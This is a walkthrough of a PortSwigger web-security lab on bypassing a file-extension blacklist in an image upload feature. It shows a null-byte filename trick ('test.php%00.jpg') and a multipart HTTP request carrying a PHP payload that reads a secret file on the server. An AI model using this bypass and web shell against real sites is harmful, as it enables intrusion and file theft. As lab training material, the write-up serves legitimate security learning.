
# Web shell upload via obfuscated file extension

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter


---------------------------------------------

References: 

- https://portswigger.net/web-security/file-upload



![img](images/Web%20shell%20upload%20via%20obfuscated%20file%20extension/1.png)

---------------------------------------------

It is not possible to upload PHP files:



![img](images/Web%20shell%20upload%20via%20obfuscated%20file%20extension/2.png)


I tried to upload the file with the names:

- “test.php.jpg” but it is interepreted as an image.

- “test.php.” but it is not accepted

- “test%2Ephp” but it is not accepted


The payload “test.php%00.jpg” uploads a file “test.php”:

```
POST /my-account/avatar HTTP/2
...
-----------------------------384622689610978532422380962615
Content-Disposition: form-data; name="avatar"; filename="test.php%00.jpg"
Content-Type: text/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
-----------------------------384622689610978532422380962615
...
```



![img](images/Web%20shell%20upload%20via%20obfuscated%20file%20extension/3.png)


The file test.php has been created:



![img](images/Web%20shell%20upload%20via%20obfuscated%20file%20extension/4.png)
